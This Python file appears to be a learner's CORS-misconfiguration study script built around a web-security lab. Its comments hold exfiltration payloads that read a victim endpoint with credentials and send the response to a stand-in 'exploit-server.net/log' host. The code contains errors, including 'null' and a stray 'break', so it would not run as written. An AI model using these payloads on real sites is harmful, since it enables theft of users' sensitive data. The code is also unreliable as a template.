import requests

# What is CORS (cross-origin resource sharing)?
## Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF).
# Server-generated ACAO header from client-specified Origin header
## Some applications need to provide access to a number of other domains. Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route of effectively allowing access from any other domain.
## One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed.
# Errors parsing Origin headers error_parsing_origin_header()
## Some applications that support access from multiple origins do so by using a whitelist of allowed origins. When a CORS request is received, the supplied origin is compared to the whitelist. If the origin appears on the whitelist then it is reflected in the Access-Control-Allow-Origin header so that access is granted.
# Whitelisted null origin value whitelisted_null_origin_value()
## The specification for the Origin header supports the value null. Browsers might send the value null in the Origin header in various unusual situations:
##    Cross-origin redirects.
##    Requests from serialized data.
##    Request using the file: protocol.
##    Sandboxed cross-origin requests.
## Some applications might whitelist the null origin to support local development of the application. 
# Exploiting XSS via CORS trust relationships xss_via_cors_trust_relationships()
## Even "correctly" configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.
# Breaking TLS with poorly configured CORS breaking_tls_via_CORS_misconfiguration()
## an attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application. This attack involves the following steps:
##    The victim user makes any plain HTTP request.
##    The attacker injects a redirection to:
##        http://trusted-subdomain.vulnerable-website.com
##    The victim's browser follows the redirect.
##    The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to:
##        https://vulnerable-website.com
##    The victim's browser makes the CORS request, including the origin:
##        http://trusted-subdomain.vulnerable-website.com
## The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
## The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.
## This attack is effective even if the vulnerable website is otherwise robust in its usage of HTTPS, with no HTTP endpoint and all cookies flagged as secure.
# Intranets and CORS without credentials
## one common situation where an attacker can't access a website directly: when it's part of an organization's intranet, and located within private IP address space. Internal websites are often held to a lower security standard than external sites, enabling attackers to find vulnerabilities and gain further access.

def server_generated_acao_header_from_client_specified_origin_header(target=null, responses=null):
    # pass the value of Origin when accessing the sensitive endpoint
    # <script>
    # var req = new XMLHttpRequest();
    # req.onload = reqListener;
    # req.open('get', 'https://victim.net/sensitiveEndpoint',true);
    # req.setRequestHeader('Origin': 'https://exploit-server.net/');
    # req.withCredentials = true;
    # req.send();

    # function reqListener() {
    # location='https://exploit-server.net/log?key='+this.responseText;
    # };
    # </script>
    if target:
        # check "Access-Control-Allow-Credentials: true" in Response
        response = requests.get('https://' + target , headers={'Origin': 'test.com'})
        print(response.headers)
        # send request with "Origin: https://malicious-site.com"
        # check for response "Access-Control-Allow-Origin: https://malicious-site.com"
    elif responses:
        # need to decide do I split the responses, only need one or parse within function
        responses = ''
    else:
        return "argument required: target or responses"
        break
    return True

def error_parsing_origin_header():
    return True

def whitelisted_null_origin_value():
    # Use an iframe to pass the origin as null
    # <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
    # var req = new XMLHttpRequest();
    # req.onload = reqListener;
    # req.open('get', 'https://victim.net/sensitiveEndpoint',true);
    # req.withCredentials = true;
    # req.send();

    # function reqListener() {
    # location='https://exploit-server.net/log?key='+this.responseText;
    # };
    # </script>"></iframe>
    return True

def xss_via_cors_trust_relationships():
    # If whitelisted domain is vulnerable to XSS then trusting site is vulnerable
    # Request:
    #     GET /api/requestApiKey HTTP/1.1
    #     Host: vulnerable-website.com
    #     Origin: https://subdomain.vulnerable-website.com
    #     Cookie: sessionid=...
    # Response:
    #     HTTP/1.1 200 OK
    #     Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
    #     Access-Control-Allow-Credentials: true
    # Exploit:
    #     https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
    return True

def breaking_tls_via_CORS_misconfiguration():
    # An attacker who is in a position to intercept a victim user's traffic can 
    # exploit the CORS configuration to compromise the victim's interaction with 
    # the application. This attack involves the following steps:
    # The victim user makes any plain HTTP request.
    # The attacker injects a redirection to:
    # http://trusted-subdomain.vulnerable-website.com

    # The victim's browser follows the redirect.
    # The attacker intercepts the plain HTTP request,
    # and returns a spoofed response containing a CORS request to:
    # https://vulnerable-website.com

    # The victim's browser makes the CORS request, including the origin:
    # http://trusted-subdomain.vulnerable-website.com
    
    # The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
    # The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.
    # This attack is effective even if the vulnerable website is otherwise robust in its usage of HTTPS, with no HTTP endpoint and all cookies flagged as secure.
    return True

def intranet_cors_without_credentials():
    return True

def main():
    server_generated_acao_header_from_client_specified_origin_header('0a5300010395cbf2821a8dfe000a003f.web-security-academy.net/accountDetails')
    return True

if __name__ == '__main__':
    main()
